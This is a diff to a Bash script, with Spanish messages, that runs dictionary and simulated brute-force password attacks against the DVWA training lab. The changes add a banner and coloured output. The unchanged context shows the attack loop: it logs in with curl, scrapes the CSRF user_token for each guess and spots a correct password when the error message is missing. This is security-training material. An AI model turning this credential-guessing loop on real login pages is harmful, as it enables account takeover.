@@ -21,6 +21,10 @@ BOLD='\033[1m'
 NC='\033[0m' # No Color
 
 
+echo "========================"
+echo " DVWA PASSWORD ATTACKS  "
+echo "========================"
+echo ""
 
 # Ayuda
 if [[ "$1" == "-h" || "$1" == "--help" ]]; then
@@ -67,7 +71,7 @@ echo "$LOGIN_FORM" > html_debug/login_form.html
 LOGIN_TOKEN=$(echo "$LOGIN_FORM" | grep -i 'user_token' | sed -E "s/.*value=['\"]([^'\"]+)['\"].*/\1/")
 
 if [[ -z "$LOGIN_TOKEN" ]]; then
-    echo "[!] No se pudo obtener el user_token del login."
+    echo -e "${RED}[!] No se pudo obtener el user_token del login.${NC}"
     exit 1
 fi
 
@@ -78,11 +82,11 @@ curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
   $LOGIN_URL > html_debug/login_response.html
 
 if grep -q "Login failed" html_debug/login_response.html; then
-    echo "[!] Falló el login. Verifica credenciales o token."
+    echo -e "${RED}[!] Falló el login. Verifica credenciales o token.${NC}"
     exit 1
 fi
 
-echo "[*] Sesión iniciada correctamente. Cookies guardadas en $COOKIE_FILE"
+echo -e "${GREEN}[*] Sesión iniciada correctamente.${NC} Cookies guardadas en $COOKIE_FILE"
 
 # ========================
 # PASO 2: CONFIGURAR HIGH
@@ -95,21 +99,21 @@ curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
   "$SECURITY_URL" > html_debug/security_response.html
 
 if ! grep -q "security.*high" $COOKIE_FILE; then
-    echo "[!] No se pudo establecer el nivel de seguridad en high."
+    echo -e "${RED}[!] No se pudo establecer el nivel de seguridad en high.${NC}"
     exit 1
 fi
 
-echo "[*] Nivel de seguridad configurado en HIGH correctamente."
+echo -e "${GREEN}[*] Nivel de seguridad configurado en HIGH correctamente.${NC}"
 
 # ========================
 # PASO 3: DEFINIR FUENTE DE CONTRASEÑAS
 # ========================
 
 if [[ "$MODE" == "dictionary" ]]; then
-  echo "[*] Modo de ataque: diccionario"
+  echo -e "${BLUE}[*]${NC} Modo de ataque: diccionario"
   PASSWORD_SOURCE=$(cat "$WORDLIST")
 elif [[ "$MODE" == "brute" ]]; then
-  echo "[*] Modo de ataque: fuerza bruta simulada (construyendo 'password')"
+  echo -e "${MAGENTA}[*]${NC} Modo de ataque: fuerza bruta simulada (construyendo 'password')"
   TARGET="password"
   PASSWORD_SOURCE=""
   CURRENT=""
@@ -133,14 +137,14 @@ echo "$PASSWORD_SOURCE" | while read -r pwd; do
     echo "$FORM_HTML" > html_debug/form_token_debug_$pwd.html
 
     if echo "$FORM_HTML" | grep -qi "you must be logged in"; then
-        echo "[!] Sesión expirada. Abortando."
+        echo -e "${YELLOW}[!]${NC} Sesión expirada. Abortando."
         exit 1
     fi
 
     TOKEN=$(echo "$FORM_HTML" | grep -i 'user_token' | sed -E "s/.*value=['\"]([^'\"]+)['\"].*/\1/")
 
     if [[ -z "$TOKEN" ]]; then
-        echo "[!] No se pudo extraer el token. Abortando..."
+        echo "${YELLOW} [!] No se pudo extraer el token${NC}. Abortando..."
         exit 1
     fi
 
@@ -156,7 +160,7 @@ echo "$PASSWORD_SOURCE" | while read -r pwd; do
     echo "$RESPONSE" > html_debug/response_$pwd.html
 
     if ! echo "$RESPONSE" | grep -q "Username and/or password incorrect."; then
-        echo "[+] Contraseña encontrada: $pwd"
+        echo -e "${GREEN}[+] Contraseña encontrada: $pwd ${NC}"
         echo "$RESPONSE" > html_debug/login_exitoso_$pwd.html
         break
     fi
